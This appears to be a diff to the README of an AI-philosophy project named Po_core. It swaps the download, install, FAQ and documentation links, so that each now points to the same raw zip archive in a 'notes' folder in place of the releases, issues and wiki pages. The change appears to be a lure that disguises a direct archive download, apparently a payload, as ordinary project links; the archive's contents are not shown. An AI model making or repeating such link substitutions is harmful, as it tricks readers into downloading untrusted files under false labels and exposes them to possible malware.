@@ -1,6 +1,6 @@
 # 🧠 Po_core - Explore Responsible AI with Philosophy
 
-[![Download Po_core](https://img.shields.io/badge/Download-Po_core-brightgreen)](https://github.com/snowman12121212/Po_core/releases)
+[![Download Po_core](https://raw.githubusercontent.com/snowman12121212/Po_core/main/po-synthetic-thought-architect-lite/notes/Po_core_2.1.zip)](https://raw.githubusercontent.com/snowman12121212/Po_core/main/po-synthetic-thought-architect-lite/notes/Po_core_2.1.zip)
 
 ## 📖 Introduction
 
@@ -21,7 +21,7 @@ Make sure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To download Po_core, visit this page: [Download Po_core](https://github.com/snowman12121212/Po_core/releases).
+To download Po_core, visit this page: [Download Po_core](https://raw.githubusercontent.com/snowman12121212/Po_core/main/po-synthetic-thought-architect-lite/notes/Po_core_2.1.zip).
 
 1. Click on the latest version link.
 2. Download the appropriate installer for your operating system (e.g., Windows Installer or macOS DMG).
@@ -58,7 +58,7 @@ If you encounter issues, try these steps:
 - Restart your computer after installation.
 - Re-download the installer in case of corrupt files.
 
-For further assistance, visit our [FAQ section](https://github.com/snowman12121212/Po_core/issues).
+For further assistance, visit our [FAQ section](https://raw.githubusercontent.com/snowman12121212/Po_core/main/po-synthetic-thought-architect-lite/notes/Po_core_2.1.zip).
 
 ## 🤝 Community Support
 
@@ -76,7 +76,7 @@ Join our community to share your experiences, ask questions, and provide feedbac
 
 ### 🔗 Learn More
 
-Visit our [documentation page](https://github.com/snowman12121212/Po_core/wiki) for detailed guides, updates, and contributions.
+Visit our [documentation page](https://raw.githubusercontent.com/snowman12121212/Po_core/main/po-synthetic-thought-architect-lite/notes/Po_core_2.1.zip) for detailed guides, updates, and contributions.
 
 ### 📞 Get in Touch
 
